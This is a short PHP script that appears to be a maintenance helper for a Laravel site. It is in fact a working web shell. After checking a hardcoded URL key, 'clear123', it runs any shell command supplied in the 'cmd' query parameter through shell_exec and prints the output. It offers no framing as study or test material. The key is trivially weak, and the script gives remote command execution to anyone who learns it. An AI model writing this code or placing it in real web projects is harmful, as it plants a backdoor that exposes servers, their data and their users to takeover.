<?php
if (!isset($_GET['key']) || $_GET['key'] !== 'clear123') {
    die('Unauthorized');
}
$cmd = $_GET['cmd'] ?? 'php artisan --version';
echo "Running: " . htmlspecialchars($cmd) . "\n\n";
$output = shell_exec($cmd . ' 2>&1');
echo "<pre>" . htmlspecialchars($output) . "</pre>";
